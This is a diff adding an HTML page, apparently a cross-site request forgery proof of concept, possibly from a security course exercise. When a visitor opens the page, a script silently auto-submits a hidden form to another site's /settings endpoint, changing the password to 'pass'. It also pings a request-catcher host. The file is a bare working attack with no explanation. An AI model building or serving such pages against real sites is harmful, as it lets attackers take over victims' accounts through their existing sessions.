@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Auto Submit Form</title>
+</head>
+<body>
+    <h1>Auto Submit Form</h1>
+    <form action="https://cats.is-course.ru/settings" method="POST" id="auto-submit-form">
+        <label for="password">Password: </label>
+        <input type="password" name="password" id="password" value="pass" required><br><br>
+
+        <label for="confirm-password">Confirm Password: </label>
+        <input type="password" name="confirm-password" id="confirm-password" value="pass" required><br><br>
+
+        <!-- The submit button is hidden and the form will be submitted automatically -->
+        <input type="submit" style="display:none;">
+    </form>
+
+    <script>
+        // Automatically submit the form on page load
+        window.onload = function() {
+            fetch('https://mocky.free.beeceptor.com')
+            .then(response => {
+                if (!response.ok) {
+                throw new Error('Network response was not ok');
+                }
+                return response; 
+            })
+            .then(data => {
+                console.log('Success:', data);
+            })
+            .catch(error => {
+                console.error('There was a problem with the fetch operation:', error);
+            });
+            document.getElementById("auto-submit-form").submit();
+        };
+    </script>
+</body>
+</html>
